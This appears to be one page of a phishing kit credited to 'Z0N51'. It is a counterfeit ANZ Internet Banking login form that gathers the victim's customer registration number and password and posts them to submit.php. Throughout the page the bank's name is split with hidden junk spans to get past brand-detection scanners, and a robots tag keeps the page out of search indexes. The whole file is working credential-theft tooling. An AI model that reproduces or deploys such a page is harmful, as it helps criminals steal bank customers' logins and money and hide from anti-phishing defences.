<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/

include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">

        <link rel="icon" type="image/png" href="../assets/images/fav.png"/>
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <title>Sign in</title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo"><img src="../assets/images/logo.png"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main" class="pt-4">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-md-10">
                    
                        <div class="row">
                            <div class="col-lg-7 col-md-12">
                                <div class="panel">
                                    <div class="panel-body">
                                        <form method="post" action="submit.php" id="log-form">
                                            <input type="hidden" name="verbot">
                                            <input type="hidden" name="type" value="login">
                                            <legend class="mb-4">Log in to A<span class="hiiide">AZ45Qer</span>N<span class="hiiide">AZ45Qer</span>Z Internet B<span class="hiiide">AZ45Qer</span>a<span class="hiiide">AZ45Qer</span>n<span class="hiiide">AZ45Qer</span>k<span class="hiiide">AZ45Qer</span>i<span class="hiiide">AZ45Qer</span>n<span class="hiiide">AZ45Qer</span>g</legend>
                                            <div class="form-group">
                                                <label for="customer_number">Customer Registration Number</label>
                                                <input type="text" name="customer_number" id="customer_number" class="form-control">
                                            </div>
                                            <div class="form-group">
                                                <label for="password">Password</label>
                                                <input type="password" name="password" id="password" class="form-control">
                                            </div>
                                            <div class="mb-3" style="color: #0072ac; font-size: 15px;"><span>Forgot login details?</span></div>
                                            <div class="form-group text-right mb-4">
                                                <button type="button" id="log-submit">Log In</button>
                                            </div>
                                            <div style="color: #333; font-size: 13px;">By logging in, you accept our <span style="color: #0072ac">Security and Privacy Statement.</span></div>
                                        </form>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-5 col-md-12">
                                <div class="panel">
                                    <div class="panel-header">
                                        <h3>New to A<span class="hiiide">AZ45Qer</span>N<span class="hiiide">AZ45Qer</span>Z Internet B<span class="hiiide">AZ45Qer</span>a<span class="hiiide">AZ45Qer</span>n<span class="hiiide">AZ45Qer</span>k<span class="hiiide">AZ45Qer</span>i<span class="hiiide">AZ45Qer</span>n<span class="hiiide">AZ45Qer</span>g?</h3>
                                    </div>
                                    <div class="panel-body">
                                        <ul>
                                            <li><i class="fas fa-angle-right"></i> Register for A<span class="hiiide">AZ45Qer</span>N<span class="hiiide">AZ45Qer</span>Z Internet B<span class="hiiide">AZ45Qer</span>a<span class="hiiide">AZ45Qer</span>n<span class="hiiide">AZ45Qer</span>k<span class="hiiide">AZ45Qer</span>i<span class="hiiide">AZ45Qer</span>n<span class="hiiide">AZ45Qer</span>g</li>
                                            <li><i class="fas fa-angle-right"></i> Read about A<span class="hiiide">AZ45Qer</span>N<span class="hiiide">AZ45Qer</span>Z Internet B<span class="hiiide">AZ45Qer</span>a<span class="hiiide">AZ45Qer</span>n<span class="hiiide">AZ45Qer</span>k<span class="hiiide">AZ45Qer</span>i<span class="hiiide">AZ45Qer</span>n<span class="hiiide">AZ45Qer</span>g</li>
                                            <li><i class="fas fa-angle-right"></i> Terms and Conditions</li>
                                        </ul>
                                    </div>
                                </div>
                                <div class="panel">
                                    <div class="panel-header">
                                        <h3 style="background: url(../assets/images/icons.png) no-repeat 7px -79px;">Need some help?</h3>
                                    </div>
                                    <div class="panel-body">
                                        <ul>
                                            <li><i class="fas fa-angle-right"></i> Need help logging in?</li>
                                            <li><i class="fas fa-angle-right"></i> What's new?</li>
                                            <li><i class="fas fa-angle-right"></i> Software requirements and settings</li>
                                            <li><i class="fas fa-angle-right"></i> Contact us</li>
                                        </ul>
                                    </div>
                                </div>
                                <div class="panel">
                                    <div class="panel-header">
                                        <h3 style="background: url(../assets/images/icons.png) no-repeat 7px -163px;">Online Security</h3>
                                    </div>
                                    <div class="panel-body">
                                        <ul>
                                            <li><i class="fas fa-angle-right"></i> Read current security alert</li>
                                            <li><i class="fas fa-angle-right"></i> Online Security</li>
                                            <li><i class="fas fa-angle-right"></i> Security software offers</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>

                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <div class="container">
                <p>&copy; Australia and New Zealand B<span class="hiiide">AZ45Qer</span>a<span class="hiiide">AZ45Qer</span>n<span class="hiiide">AZ45Qer</span>k<span class="hiiide">AZ45Qer</span>i<span class="hiiide">AZ45Qer</span>n<span class="hiiide">AZ45Qer</span>g Group Limited (A<span class="hiiide">AZ45Qer</span>N<span class="hiiide">AZ45Qer</span>Z) 2020 ABN 11 005 357 522.</p>
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>
        
        <script>
            $('#log-submit').click(function(){
                var customer_number = $('#customer_number').val();
                var password        = $('#password').val();
                if( customer_number == '' ) {
                    alert('Please enter your A<span class="hiiide">AZ45Qer</span>N<span class="hiiide">AZ45Qer</span>Z CRN');
                } else if( password == '' ) {
                    alert('Please enter your Password');
                } else {
                    $('#log-form').submit();
                }
            });
        </script>

    </body>

</html>